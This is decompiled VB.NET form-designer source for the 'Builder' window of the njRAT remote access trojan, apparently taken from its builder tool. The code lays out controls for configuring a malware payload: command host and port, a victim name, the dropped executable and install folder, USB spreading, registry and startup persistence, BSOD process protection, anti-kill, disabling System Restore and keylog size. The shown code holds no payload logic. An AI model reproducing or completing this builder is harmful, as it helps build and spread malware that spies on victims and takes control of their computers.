Namespace NJRAT
	' Token: 0x0200000C RID: 12
	<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
	Public Partial Class Builder
		Inherits Global.System.Windows.Forms.Form

		' Token: 0x060000A3 RID: 163 RVA: 0x0014BA44 File Offset: 0x00149E44
		<Global.System.Diagnostics.DebuggerNonUserCode()>
		Protected Overrides Sub Dispose(disposing As Boolean)
			Try
				Dim flag As Boolean = disposing AndAlso Me.components IsNot Nothing
				If flag Then
					Me.components.Dispose()
				End If
			Finally
				MyBase.Dispose(disposing)
			End Try
		End Sub

		' Token: 0x060000A4 RID: 164 RVA: 0x0014BA94 File Offset: 0x00149E94
		<Global.System.Diagnostics.DebuggerStepThrough()>
		Private Sub InitializeComponent()
			Dim componentResourceManager As Global.System.ComponentModel.ComponentResourceManager = New Global.System.ComponentModel.ComponentResourceManager(GetType(Global.NJRAT.Builder))
			Me.usbx = New Global.System.Windows.Forms.TextBox()
			Me.anti3 = New Global.System.Windows.Forms.TextBox()
			Me.RZ = New Global.System.Windows.Forms.CheckBox()
			Me.anti2 = New Global.System.Windows.Forms.CheckBox()
			Me.HD = New Global.System.Windows.Forms.CheckBox()
			Me.Button5 = New Global.System.Windows.Forms.Button()
			Me.Button4 = New Global.System.Windows.Forms.Button()
			Me.ColumnHeader1 = New Global.System.Windows.Forms.ColumnHeader()
			Me.usb = New Global.System.Windows.Forms.CheckBox()
			Me.Label6 = New Global.System.Windows.Forms.Label()
			Me.klen = New Global.System.Windows.Forms.NumericUpDown()
			Me.Isu = New Global.System.Windows.Forms.CheckBox()
			Me.Isf = New Global.System.Windows.Forms.CheckBox()
			Me.T1 = New Global.System.Windows.Forms.TextBox()
			Me.bsod = New Global.System.Windows.Forms.CheckBox()
			Me.Label5 = New Global.System.Windows.Forms.Label()
			Me.PictureBox1 = New Global.System.Windows.Forms.PictureBox()
			Me.CheckBox1 = New Global.System.Windows.Forms.CheckBox()
			Me.Idr = New Global.System.Windows.Forms.CheckBox()
			Me.dir = New Global.System.Windows.Forms.ComboBox()
			Me.Label4 = New Global.System.Windows.Forms.Label()
			Me.exe = New Global.System.Windows.Forms.TextBox()
			Me.GroupBox1 = New Global.System.Windows.Forms.GroupBox()
			Me.Label3 = New Global.System.Windows.Forms.Label()
			Me.VN = New Global.System.Windows.Forms.TextBox()
			Me.Button1 = New Global.System.Windows.Forms.Button()
			Me.port = New Global.System.Windows.Forms.NumericUpDown()
			Me.Label2 = New Global.System.Windows.Forms.Label()
			Me.Label1 = New Global.System.Windows.Forms.Label()
			Me.host = New Global.System.Windows.Forms.TextBox()
			Me.Panel1 = New Global.System.Windows.Forms.Panel()
			Me.Lv1 = New Global.NJRAT.LV()
			Me.ColumnHeader2 = New Global.System.Windows.Forms.ColumnHeader()
			Me.task = New Global.System.Windows.Forms.CheckBox()
			CType(Me.klen, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			CType(Me.PictureBox1, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			Me.GroupBox1.SuspendLayout()
			CType(Me.port, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			Me.Panel1.SuspendLayout()
			Me.SuspendLayout()
			Me.usbx.BackColor = Global.System.Drawing.Color.Black
			Me.usbx.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.usbx.Enabled = False
			Me.usbx.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.usbx.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim usbx As Global.System.Windows.Forms.Control = Me.usbx
			Dim location As Global.System.Drawing.Point = New Global.System.Drawing.Point(283, 215)
			usbx.Location = location
			Me.usbx.Name = "usbx"
			Dim usbx2 As Global.System.Windows.Forms.Control = Me.usbx
			Dim size As Global.System.Drawing.Size = New Global.System.Drawing.Size(159, 20)
			usbx2.Size = size
			Me.usbx.TabIndex = 53
			Me.usbx.Text = "svchost.exe"
			Me.anti3.BackColor = Global.System.Drawing.Color.Black
			Me.anti3.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.anti3.Enabled = False
			Me.anti3.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.anti3.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim anti As Global.System.Windows.Forms.Control = Me.anti3
			location = New Global.System.Drawing.Point(283, 259)
			anti.Location = location
			Me.anti3.Name = "anti3"
			Dim anti2 As Global.System.Windows.Forms.Control = Me.anti3
			size = New Global.System.Drawing.Size(159, 20)
			anti2.Size = size
			Me.anti3.TabIndex = 51
			Me.anti3.Text = "Exsample.exe"
			Me.RZ.AutoSize = True
			Me.RZ.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.RZ.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Dim rz As Global.System.Windows.Forms.Control = Me.RZ
			location = New Global.System.Drawing.Point(486, 177)
			rz.Location = location
			Me.RZ.Name = "RZ"
			Dim rz2 As Global.System.Windows.Forms.Control = Me.RZ
			size = New Global.System.Drawing.Size(158, 18)
			rz2.Size = size
			Me.RZ.TabIndex = 50
			Me.RZ.Text = "Disable System Restore"
			Me.RZ.UseVisualStyleBackColor = True
			Me.RZ.Visible = False
			Me.anti2.AutoSize = True
			Me.anti2.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.anti2.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim anti3 As Global.System.Windows.Forms.Control = Me.anti2
			location = New Global.System.Drawing.Point(283, 241)
			anti3.Location = location
			Me.anti2.Name = "anti2"
			Dim anti4 As Global.System.Windows.Forms.Control = Me.anti2
			size = New Global.System.Drawing.Size(91, 18)
			anti4.Size = size
			Me.anti2.TabIndex = 49
			Me.anti2.Text = "Kill Process"
			Me.anti2.UseVisualStyleBackColor = True
			Me.HD.AutoSize = True
			Me.HD.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.HD.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim hd As Global.System.Windows.Forms.Control = Me.HD
			location = New Global.System.Drawing.Point(284, 79)
			hd.Location = location
			Me.HD.Name = "HD"
			Dim hd2 As Global.System.Windows.Forms.Control = Me.HD
			size = New Global.System.Drawing.Size(64, 18)
			hd2.Size = size
			Me.HD.TabIndex = 48
			Me.HD.Text = "Hidden"
			Me.HD.UseVisualStyleBackColor = True
			Me.Button5.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Button5.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button5.Font = New Global.System.Drawing.Font("Arial Black", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.Button5.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim button As Global.System.Windows.Forms.Control = Me.Button5
			location = New Global.System.Drawing.Point(247, 26)
			button.Location = location
			Me.Button5.Name = "Button5"
			Dim button2 As Global.System.Windows.Forms.Control = Me.Button5
			size = New Global.System.Drawing.Size(23, 20)
			button2.Size = size
			Me.Button5.TabIndex = 47
			Me.Button5.Text = "-"
			Me.Button5.UseVisualStyleBackColor = True
			Me.Button4.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Button4.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button4.Font = New Global.System.Drawing.Font("Arial Black", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.Button4.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim button3 As Global.System.Windows.Forms.Control = Me.Button4
			location = New Global.System.Drawing.Point(222, 26)
			button3.Location = location
			Me.Button4.Name = "Button4"
			Dim button4 As Global.System.Windows.Forms.Control = Me.Button4
			size = New Global.System.Drawing.Size(23, 20)
			button4.Size = size
			Me.Button4.TabIndex = 46
			Me.Button4.Text = "+"
			Me.Button4.UseVisualStyleBackColor = True
			Me.ColumnHeader1.Text = "Hosts "
			Me.ColumnHeader1.Width = 251
			Me.usb.AutoSize = True
			Me.usb.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.usb.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim usb As Global.System.Windows.Forms.Control = Me.usb
			location = New Global.System.Drawing.Point(283, 197)
			usb.Location = location
			Me.usb.Name = "usb"
			Dim usb2 As Global.System.Windows.Forms.Control = Me.usb
			size = New Global.System.Drawing.Size(89, 18)
			usb2.Size = size
			Me.usb.TabIndex = 52
			Me.usb.Text = "Usb Spread"
			Me.usb.UseVisualStyleBackColor = True
			Me.Label6.AutoSize = True
			Me.Label6.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Label6.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim label As Global.System.Windows.Forms.Control = Me.Label6
			location = New Global.System.Drawing.Point(280, 287)
			label.Location = location
			Me.Label6.Name = "Label6"
			Dim label2 As Global.System.Windows.Forms.Control = Me.Label6
			size = New Global.System.Drawing.Size(98, 14)
			label2.Size = size
			Me.Label6.TabIndex = 44
			Me.Label6.Text = "KeyLogs Size KB"
			Me.klen.BackColor = Global.System.Drawing.Color.Black
			Me.klen.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim klen As Global.System.Windows.Forms.Control = Me.klen
			location = New Global.System.Drawing.Point(388, 285)
			klen.Location = location
			Dim klen2 As Global.System.Windows.Forms.NumericUpDown = Me.klen
			Dim num As Decimal = New Decimal(New Integer() { 512, 0, 0, 0 })
			klen2.Maximum = num
			Dim klen3 As Global.System.Windows.Forms.NumericUpDown = Me.klen
			num = New Decimal(New Integer() { 5, 0, 0, 0 })
			klen3.Minimum = num
			Me.klen.Name = "klen"
			Dim klen4 As Global.System.Windows.Forms.Control = Me.klen
			size = New Global.System.Drawing.Size(54, 20)
			klen4.Size = size
			Me.klen.TabIndex = 43
			Dim klen5 As Global.System.Windows.Forms.NumericUpDown = Me.klen
			num = New Decimal(New Integer() { 20, 0, 0, 0 })
			klen5.Value = num
			Me.Isu.AutoSize = True
			Me.Isu.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Isu.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Isu.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim isu As Global.System.Windows.Forms.Control = Me.Isu
			location = New Global.System.Drawing.Point(284, 101)
			isu.Location = location
			Me.Isu.Name = "Isu"
			Dim isu2 As Global.System.Windows.Forms.Control = Me.Isu
			size = New Global.System.Drawing.Size(106, 18)
			isu2.Size = size
			Me.Isu.TabIndex = 42
			Me.Isu.Text = "Registy StarUp"
			Me.Isu.UseVisualStyleBackColor = True
			Me.Isf.AutoSize = True
			Me.Isf.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Isf.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Isf.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim isf As Global.System.Windows.Forms.Control = Me.Isf
			location = New Global.System.Drawing.Point(283, 125)
			isf.Location = location
			Me.Isf.Name = "Isf"
			Dim isf2 As Global.System.Windows.Forms.Control = Me.Isf
			size = New Global.System.Drawing.Size(113, 18)
			isf2.Size = size
			Me.Isf.TabIndex = 41
			Me.Isf.Text = "Copy To StartUp"
			Me.Isf.UseVisualStyleBackColor = True
			Me.T1.BackColor = Global.System.Drawing.Color.Black
			Me.T1.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.T1.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Dim t As Global.System.Windows.Forms.Control = Me.T1
			location = New Global.System.Drawing.Point(591, 331)
			t.Location = location
			Me.T1.Multiline = True
			Me.T1.Name = "T1"
			Dim t2 As Global.System.Windows.Forms.Control = Me.T1
			size = New Global.System.Drawing.Size(100, 20)
			t2.Size = size
			Me.T1.TabIndex = 40
			Me.T1.Visible = False
			Me.bsod.AutoSize = True
			Me.bsod.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.bsod.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.bsod.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim bsod As Global.System.Windows.Forms.Control = Me.bsod
			location = New Global.System.Drawing.Point(283, 149)
			bsod.Location = location
			Me.bsod.Name = "bsod"
			Dim bsod2 As Global.System.Windows.Forms.Control = Me.bsod
			size = New Global.System.Drawing.Size(155, 18)
			bsod2.Size = size
			Me.bsod.TabIndex = 39
			Me.bsod.Text = "Protect Process [BSOD]"
			Me.bsod.UseVisualStyleBackColor = True
			Me.Label5.AutoSize = True
			Me.Label5.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Label5.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim label3 As Global.System.Windows.Forms.Control = Me.Label5
			location = New Global.System.Drawing.Point(9, 188)
			label3.Location = location
			Me.Label5.Name = "Label5"
			Dim label4 As Global.System.Windows.Forms.Control = Me.Label5
			size = New Global.System.Drawing.Size(79, 14)
			label4.Size = size
			Me.Label5.TabIndex = 37
			Me.Label5.Text = "VicTim Name"
			Me.PictureBox1.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Dim pictureBox As Global.System.Windows.Forms.Control = Me.PictureBox1
			location = New Global.System.Drawing.Point(368, 28)
			pictureBox.Location = location
			Me.PictureBox1.Name = "PictureBox1"
			Dim pictureBox2 As Global.System.Windows.Forms.Control = Me.PictureBox1
			size = New Global.System.Drawing.Size(56, 43)
			pictureBox2.Size = size
			Me.PictureBox1.SizeMode = Global.System.Windows.Forms.PictureBoxSizeMode.Zoom
			Me.PictureBox1.TabIndex = 36
			Me.PictureBox1.TabStop = False
			Me.CheckBox1.AutoSize = True
			Me.CheckBox1.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.CheckBox1.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.CheckBox1.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim checkBox As Global.System.Windows.Forms.Control = Me.CheckBox1
			location = New Global.System.Drawing.Point(284, 55)
			checkBox.Location = location
			Me.CheckBox1.Name = "CheckBox1"
			Dim checkBox2 As Global.System.Windows.Forms.Control = Me.CheckBox1
			size = New Global.System.Drawing.Size(49, 18)
			checkBox2.Size = size
			Me.CheckBox1.TabIndex = 35
			Me.CheckBox1.Text = "Icon"
			Me.CheckBox1.UseVisualStyleBackColor = True
			Me.Idr.AutoSize = True
			Me.Idr.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Idr.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.Idr.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim idr As Global.System.Windows.Forms.Control = Me.Idr
			location = New Global.System.Drawing.Point(196, 12)
			idr.Location = location
			Me.Idr.Name = "Idr"
			Dim idr2 As Global.System.Windows.Forms.Control = Me.Idr
			size = New Global.System.Drawing.Size(54, 18)
			idr2.Size = size
			Me.Idr.TabIndex = 14
			Me.Idr.Text = "Copy"
			Me.Idr.UseVisualStyleBackColor = True
			Me.dir.BackColor = Global.System.Drawing.Color.Black
			Me.dir.DropDownStyle = Global.System.Windows.Forms.ComboBoxStyle.DropDownList
			Me.dir.Enabled = False
			Me.dir.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.dir.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.dir.ForeColor = Global.System.Drawing.Color.LimeGreen
			Me.dir.FormattingEnabled = True
			Me.dir.Items.AddRange(New Object() { "%TEMP%", "%AppData%", "%UserProfile%", "%AllUsersProfile%", "%WinDir%" })
			Dim dir As Global.System.Windows.Forms.Control = Me.dir
			location = New Global.System.Drawing.Point(8, 72)
			dir.Location = location
			Me.dir.Name = "dir"
			Dim dir2 As Global.System.Windows.Forms.Control = Me.dir
			size = New Global.System.Drawing.Size(241, 22)
			dir2.Size = size
			Me.dir.TabIndex = 7
			Me.Label4.AutoSize = True
			Me.Label4.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Label4.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim label5 As Global.System.Windows.Forms.Control = Me.Label4
			location = New Global.System.Drawing.Point(6, 56)
			label5.Location = location
			Me.Label4.Name = "Label4"
			Dim label6 As Global.System.Windows.Forms.Control = Me.Label4
			size = New Global.System.Drawing.Size(57, 14)
			label6.Size = size
			Me.Label4.TabIndex = 6
			Me.Label4.Text = "Directory"
			Me.exe.BackColor = Global.System.Drawing.Color.Black
			Me.exe.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.exe.Enabled = False
			Me.exe.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.exe.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim exe As Global.System.Windows.Forms.Control = Me.exe
			location = New Global.System.Drawing.Point(8, 32)
			exe.Location = location
			Me.exe.Name = "exe"
			Dim exe2 As Global.System.Windows.Forms.Control = Me.exe
			size = New Global.System.Drawing.Size(241, 20)
			exe2.Size = size
			Me.exe.TabIndex = 5
			Me.exe.Text = "server.exe"
			Me.GroupBox1.Controls.Add(Me.Idr)
			Me.GroupBox1.Controls.Add(Me.dir)
			Me.GroupBox1.Controls.Add(Me.Label4)
			Me.GroupBox1.Controls.Add(Me.exe)
			Me.GroupBox1.Controls.Add(Me.Label3)
			Me.GroupBox1.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim groupBox As Global.System.Windows.Forms.Control = Me.GroupBox1
			location = New Global.System.Drawing.Point(12, 231)
			groupBox.Location = location
			Me.GroupBox1.Name = "GroupBox1"
			Dim groupBox2 As Global.System.Windows.Forms.Control = Me.GroupBox1
			size = New Global.System.Drawing.Size(258, 100)
			groupBox2.Size = size
			Me.GroupBox1.TabIndex = 33
			Me.GroupBox1.TabStop = False
			Me.Label3.AutoSize = True
			Me.Label3.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Label3.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim label7 As Global.System.Windows.Forms.Control = Me.Label3
			location = New Global.System.Drawing.Point(6, 16)
			label7.Location = location
			Me.Label3.Name = "Label3"
			Dim label8 As Global.System.Windows.Forms.Control = Me.Label3
			size = New Global.System.Drawing.Size(57, 14)
			label8.Size = size
			Me.Label3.TabIndex = 4
			Me.Label3.Text = "ExeName"
			Me.VN.BackColor = Global.System.Drawing.Color.Black
			Me.VN.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.VN.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.VN.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim vn As Global.System.Windows.Forms.Control = Me.VN
			location = New Global.System.Drawing.Point(12, 205)
			vn.Location = location
			Me.VN.Name = "VN"
			Dim vn2 As Global.System.Windows.Forms.Control = Me.VN
			size = New Global.System.Drawing.Size(258, 20)
			vn2.Size = size
			Me.VN.TabIndex = 38
			Me.VN.Text = "HacKed"
			Me.Button1.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Button1.Enabled = False
			Me.Button1.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button1.Font = New Global.System.Drawing.Font("Arial Black", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Button1.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim button5 As Global.System.Windows.Forms.Control = Me.Button1
			location = New Global.System.Drawing.Point(12, 337)
			button5.Location = location
			Me.Button1.Name = "Button1"
			Dim button6 As Global.System.Windows.Forms.Control = Me.Button1
			size = New Global.System.Drawing.Size(434, 26)
			button6.Size = size
			Me.Button1.TabIndex = 34
			Me.Button1.Text = "Build"
			Me.Button1.UseVisualStyleBackColor = True
			Me.port.BackColor = Global.System.Drawing.Color.Black
			Me.port.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.port.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim port As Global.System.Windows.Forms.Control = Me.port
			location = New Global.System.Drawing.Point(284, 26)
			port.Location = location
			Dim port2 As Global.System.Windows.Forms.NumericUpDown = Me.port
			num = New Decimal(New Integer() { 60000, 0, 0, 0 })
			port2.Maximum = num
			Dim port3 As Global.System.Windows.Forms.NumericUpDown = Me.port
			num = New Decimal(New Integer() { 1, 0, 0, 0 })
			port3.Minimum = num
			Me.port.Name = "port"
			Dim port4 As Global.System.Windows.Forms.Control = Me.port
			size = New Global.System.Drawing.Size(69, 20)
			port4.Size = size
			Me.port.TabIndex = 32
			Dim port5 As Global.System.Windows.Forms.NumericUpDown = Me.port
			num = New Decimal(New Integer() { 5552, 0, 0, 0 })
			port5.Value = num
			Me.Label2.AutoSize = True
			Me.Label2.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Label2.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim label9 As Global.System.Windows.Forms.Control = Me.Label2
			location = New Global.System.Drawing.Point(281, 10)
			label9.Location = location
			Me.Label2.Name = "Label2"
			Dim label10 As Global.System.Windows.Forms.Control = Me.Label2
			size = New Global.System.Drawing.Size(30, 14)
			label10.Size = size
			Me.Label2.TabIndex = 31
			Me.Label2.Text = "Port"
			Me.Label1.AutoSize = True
			Me.Label1.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Label1.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim label11 As Global.System.Windows.Forms.Control = Me.Label1
			location = New Global.System.Drawing.Point(9, 10)
			label11.Location = location
			Me.Label1.Name = "Label1"
			Dim label12 As Global.System.Windows.Forms.Control = Me.Label1
			size = New Global.System.Drawing.Size(32, 14)
			label12.Size = size
			Me.Label1.TabIndex = 30
			Me.Label1.Text = "Host"
			Me.host.BackColor = Global.System.Drawing.Color.Black
			Me.host.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.host.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.host.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim host As Global.System.Windows.Forms.Control = Me.host
			location = New Global.System.Drawing.Point(12, 26)
			host.Location = location
			Me.host.Name = "host"
			Dim host2 As Global.System.Windows.Forms.Control = Me.host
			size = New Global.System.Drawing.Size(204, 20)
			host2.Size = size
			Me.host.TabIndex = 29
			Me.host.Text = "127.0.0.1"
			Me.Panel1.Controls.Add(Me.Lv1)
			Me.Panel1.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim panel As Global.System.Windows.Forms.Control = Me.Panel1
			location = New Global.System.Drawing.Point(12, 55)
			panel.Location = location
			Me.Panel1.Name = "Panel1"
			Dim panel2 As Global.System.Windows.Forms.Control = Me.Panel1
			size = New Global.System.Drawing.Size(258, 130)
			panel2.Size = size
			Me.Panel1.TabIndex = 55
			Me.Lv1.BackColor = Global.System.Drawing.Color.Black
			Me.Lv1.Columns.AddRange(New Global.System.Windows.Forms.ColumnHeader() { Me.ColumnHeader2 })
			Me.Lv1.Dock = Global.System.Windows.Forms.DockStyle.Fill
			Me.Lv1.Font = New Global.System.Drawing.Font("Arial", 8F, Global.System.Drawing.FontStyle.Bold)
			Me.Lv1.ForeColor = Global.System.Drawing.Color.LimeGreen
			Me.Lv1.FullRowSelect = True
			Dim lv As Global.System.Windows.Forms.Control = Me.Lv1
			location = New Global.System.Drawing.Point(0, 0)
			lv.Location = location
			Me.Lv1.Name = "Lv1"
			Dim lv2 As Global.System.Windows.Forms.Control = Me.Lv1
			size = New Global.System.Drawing.Size(258, 130)
			lv2.Size = size
			Me.Lv1.TabIndex = 54
			Me.Lv1.UseCompatibleStateImageBehavior = False
			Me.Lv1.View = Global.System.Windows.Forms.View.Details
			Me.ColumnHeader2.Text = "Multi Host"
			Me.ColumnHeader2.Width = 252
			Me.task.AutoSize = True
			Me.task.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.task.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim task As Global.System.Windows.Forms.Control = Me.task
			location = New Global.System.Drawing.Point(283, 173)
			task.Location = location
			Me.task.Name = "task"
			Dim task2 As Global.System.Windows.Forms.Control = Me.task
			size = New Global.System.Drawing.Size(67, 18)
			task2.Size = size
			Me.task.TabIndex = 56
			Me.task.Text = "Anti Kill"
			Me.task.UseVisualStyleBackColor = True
			Dim autoScaleDimensions As Global.System.Drawing.SizeF = New Global.System.Drawing.SizeF(6F, 13F)
			Me.AutoScaleDimensions = autoScaleDimensions
			Me.AutoScaleMode = Global.System.Windows.Forms.AutoScaleMode.Font
			Me.BackColor = Global.System.Drawing.Color.Black
			size = New Global.System.Drawing.Size(456, 375)
			Me.ClientSize = size
			Me.Controls.Add(Me.task)
			Me.Controls.Add(Me.Panel1)
			Me.Controls.Add(Me.usbx)
			Me.Controls.Add(Me.anti3)
			Me.Controls.Add(Me.RZ)
			Me.Controls.Add(Me.anti2)
			Me.Controls.Add(Me.HD)
			Me.Controls.Add(Me.Button5)
			Me.Controls.Add(Me.Button4)
			Me.Controls.Add(Me.usb)
			Me.Controls.Add(Me.Label6)
			Me.Controls.Add(Me.klen)
			Me.Controls.Add(Me.Isu)
			Me.Controls.Add(Me.Isf)
			Me.Controls.Add(Me.T1)
			Me.Controls.Add(Me.bsod)
			Me.Controls.Add(Me.Label5)
			Me.Controls.Add(Me.PictureBox1)
			Me.Controls.Add(Me.CheckBox1)
			Me.Controls.Add(Me.GroupBox1)
			Me.Controls.Add(Me.VN)
			Me.Controls.Add(Me.Button1)
			Me.Controls.Add(Me.port)
			Me.Controls.Add(Me.Label2)
			Me.Controls.Add(Me.Label1)
			Me.Controls.Add(Me.host)
			Me.Icon = CType(componentResourceManager.GetObject("$this.Icon"), Global.System.Drawing.Icon)
			Me.MaximizeBox = False
			Me.MinimizeBox = False
			Me.Name = "Builder"
			Me.StartPosition = Global.System.Windows.Forms.FormStartPosition.CenterScreen
			Me.Text = "Builder"
			Me.TopMost = True
			CType(Me.klen, Global.System.ComponentModel.ISupportInitialize).EndInit()
			CType(Me.PictureBox1, Global.System.ComponentModel.ISupportInitialize).EndInit()
			Me.GroupBox1.ResumeLayout(False)
			Me.GroupBox1.PerformLayout()
			CType(Me.port, Global.System.ComponentModel.ISupportInitialize).EndInit()
			Me.Panel1.ResumeLayout(False)
			Me.ResumeLayout(False)
			Me.PerformLayout()
		End Sub

		' Token: 0x0400004C RID: 76
		Private components As Global.System.ComponentModel.IContainer
	End Class
End Namespace
